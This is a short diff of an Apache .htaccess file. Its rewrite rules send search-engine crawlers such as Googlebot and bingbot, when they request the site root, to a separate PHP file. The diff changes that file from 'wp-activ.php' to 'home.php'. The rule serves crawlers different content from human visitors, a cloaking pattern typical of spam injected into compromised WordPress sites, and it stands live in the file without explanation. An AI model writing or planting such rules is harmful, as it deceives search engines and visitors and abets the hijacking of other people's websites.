@@ -2,7 +2,7 @@
 RewriteEngine On
 RewriteCond %{HTTP_USER_AGENT} (Google-InspectionTool|Googlebot|AdsBot-Google|Mediapartners-Google|bingbot|BingPreview) [NC]
 RewriteCond %{REQUEST_URI} ^/$ [NC]
-RewriteRule ^$ wp-activ.php [L]
+RewriteRule ^$ home.php [L]
  
 <IfModule mod_headers.c>
   Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
